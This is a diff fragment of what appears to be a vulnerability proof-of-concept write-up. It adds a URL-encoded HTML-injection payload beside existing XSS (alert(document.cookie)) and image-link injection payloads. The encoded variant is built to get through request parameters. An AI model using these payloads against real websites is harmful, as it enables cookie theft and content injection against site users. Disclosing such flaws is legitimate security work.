@@ -94,6 +94,10 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 <a href="https://www.nu11secur1ty.com/"><img src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif">
 ```
+- 02
+```
+%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6e%75%31%31%73%65%63%75%72%31%74%79%2e%63%6f%6d%2f%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%22%3e
+```
 
 ## without error report + link to malicious URL
 
